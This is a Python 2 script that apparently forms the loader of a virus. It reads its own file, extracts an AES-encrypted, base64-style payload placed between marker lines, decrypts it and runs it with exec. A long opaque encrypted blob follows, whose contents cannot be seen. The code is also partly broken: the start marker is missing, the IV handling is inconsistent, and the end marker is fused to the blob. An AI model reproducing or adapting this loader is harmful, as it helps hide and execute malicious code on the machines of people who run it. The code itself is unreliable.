######################################################## First script python
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data, b"#"b"\\");

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Encryption function
def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted, b"#"b"\\")
   #return encrypted

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(encrypt(cipher_payload))
print e
exec e

sys.exit('Good job!')

CFiXDvP27Dm1eIiiucS\6ES0f\918ypAhQ00nI#SU4ckKeoUMNRVflg\F#st#lozFaBZrgmXjXjf5E9a7BPe4M72gRJRRdRCb5l90iB0QCWVRjN4LVmXSuXFLw3gGoiadtJz8fsjRknkTKUL44IJHGq4Uzq6C4oNSlw2izgCKgplTbGhOAJ14M8aXHAygGT#S#HTmITWb6P3ua8xC1iunou36y0oP1DZeH0p#pOeV6\9qVlUc0LOmNwsgJoo7nt0Ys1KQZB6cMqczrHo2yVu3K39k9GRj6zPXBfRRHuRe2dK5Hkjb4pwnHCELcIHTw69\wapbROHsI0Iq5BKwhv4sjKCgNrNKihWtbI28hvy8EyiIjQ8oHogRF3UeyYOKsc83L2Tmd9uP9w2\SMYZ7Zm#N1vFpAPNfMBSRn3xJRDUCzWxqRADjQA3SsSYEUqQ4HMI#\h75Vsm8Qv7jae6dJkwW9sADdcJhya#cAajLFWcXwoBcXBJJd0LqJL9CS0xCts0M71NOLgXGlcLaSbvbnRowQxLAAACHVSgiV8sy5b52JGbwOtWTBM#hGXv8npT4G8iXrioClWHwgZLOaYiVrHbi\oWByF72wqbleAYU\4IZBMbLtFPjBII7OcW4o9fJZ4MqZzg2Ja7ls9aJCu7TVjQYaNvl7px98xH3WI#YZMEXWwrCOv2LWlmssi1OaAnBxZ6CbTh1mNEj9blfYJRR2J7igCLFs78tRT493EukiToSqKL40XfYV1ujcmbCyatjd5grm5A5yrhDtJBNwX8ETGxMrjJQOvFYGnOEOU#BVraJdFZSxnZgNQfsDTmvpaLnfnDgZ#KZEiK1TLfXiFhUuyCB8eV\9#dbhJ3w9n2#1kG#V8Bw0dsz\MrMiZFA7XkXNGyu6ROkRNqXksTlhcnzEh\Jvj1PxxkdJSq8yS9suoi9mYJ3oSAVIKXQB3kME8v9KmIVwjoVfMoPj0kSR1UgsonudWm\zsKPPkpQ#np29aGKKe3xptSlRt092h9eLhHjNIOZHcNGzT\WgVfHB2tzzRFWkBgbgbfe1R5L\xxboxeWrvh3eXQmRoOIqgK1pnG46GzrOVcoSmMTmlErS#NCz744MnQ4DGWmdphNCttDGHt0kDMVh2VN83AvkbXcwx8oOT4UjefiOeXe6xHSockmjghyUQkefs\cOgE0oyGe3qzHdSuUOUFhKbmozxVIushWePNj1H5EgnWdvmBI\BnmTmmBec8lkc7D9zbmE5#p5wg14LAFaRpXQAi\\pAemyekqMLDZEy22NWa0Y5abZn#nRnKSpSKwa7x4zNC7AvkKXeyptSpoabfkppb3m6thPaLEOfG1QDzAWsjukY6a7Q4kN7TQeZtKX71VVtqJqjuaCgfg1MKcH9oRBtEQSFWvbXj26lXWfzra04v5hHCNvdkJhx2E8iRNUKb06yDdf8UylIFFPLkzfz4HJ0rNNEu7ezkYs6r7iKigatTTg8z3NGpDBG#GIow2cf\YQfMVJnCZBPVyiq8\fqppE7m39F5D0HPYPQnWS#i0zmnTWr0KpazOosuv7hWOdKyeJGyC\4tErYehIdXOcxpVkA\22DZyK9M7ybxeVZNKSSUQMuiIQa9xJh9VNrUJYkRWUf4VjlXGDE8ZVcg98dcLvxcSFgKsdQPecbizfK9a\b9vWWXVUWpgVZMzwyzjsSAEQNjUSTiqbm#pRWV5P4SmbYF5KyI0GaB\5S2uhRKzV#SKJsGVQdqwihBRrBDNjiDdINenApVej0XA1dgtkTJsLLWV7kP#XinQVcvJ2tyNelXYaumujL1R77yQDJxVUYI6X#RfZ9CXNuT1SiQD7K5hO1g0nWnqXzcBmK0Oqa7V8i13wlQ1WzDmx7b4qwlgx\N#1B#y\3GsmJlxiBavTUhz9XJJsnP\GCahuo8NX6v75PFhG8#192j#1cBTFfT83vR2pXBjb8wlXfU6OZqaVjezyXdMPI9doeWE5bYdfv#HmO0Ys#zyzGS9cXf3\pr1aMMqbHRwGapi0QBZg4Y6n1XoTj6lmHjI2c\taLxu1GeqZskK4la28jdhEmHlpl3UuC1JDn4PQ3g7ds\phTC\#r#FIsnkfbCL0Qf8Z8hmMa00lRHVo1DugvQZG8gE2shSLPFOnuEXpK33Fp\tTvrc3uzGikXLRFGpYxwDrb1UqVpkxLvv8Dzb22HUEiv72RUHRQUF0h62Z7MT6BsNHCJqaIsC4jivF#YV5X98GYFOfajdI1x4jDsJR8UhYxJ80yG6KR5AHRZ3EFJw7cy63VsFSaWetq5aVYJfte0w2lzD9q6yQqVKHK#D1j5b#TvDB#2jJdYNh7zXXnwK1VKjIrya9kWJa3xuHEivHtvC56fA5gTA#End payload